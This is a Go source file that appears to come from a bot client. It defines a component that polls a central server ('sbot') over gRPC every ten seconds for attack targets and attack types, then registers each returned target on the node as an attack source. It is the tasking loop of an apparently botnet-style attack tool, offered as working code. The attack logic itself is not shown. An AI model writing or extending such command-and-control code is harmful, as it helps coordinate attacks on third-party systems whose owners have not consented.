package node

import (
	"context"
	"github.com/cbot/client/model"
	"github.com/cbot/client/service"
	"google.golang.org/grpc"
	"time"
)

const (

	FetchAttackTargetsTimeInterval = 10*time.Second
)

type AttackTargetsClient struct {

	nd *Node

	grpcClient *grpc.ClientConn

	attackTargetsClient service.AttackTargetsServiceClient

}

func NewAttackTargetsClient(nd *Node, grpcClient *grpc.ClientConn) *AttackTargetsClient {

	return &AttackTargetsClient{
		nd:                  nd,
		grpcClient:          grpcClient,
		attackTargetsClient: service.NewAttackTargetsServiceClient(grpcClient),
	}
}

func (atc *AttackTargetsClient)Start() {

	tchan := time.Tick(FetchAttackTargetsTimeInterval)

	go func() {

		for {

			select {
			case <-tchan:

				//try to fetch attack targets from sbot

				if targets,err:= atc.attackTargetsClient.FetchAttackTargets(context.Background(),
					&model.FetchAttackTargetsRequest{NodeId:atc.nd.nodeId});err==nil {

					//ok
					if targets.Content!=nil &&len(targets.Content)>0 {

						atc.nd.AddAttackSource(targets.Name,targets.AttackTypes,targets.Content)

					}
				}

			}
		}
	}()

}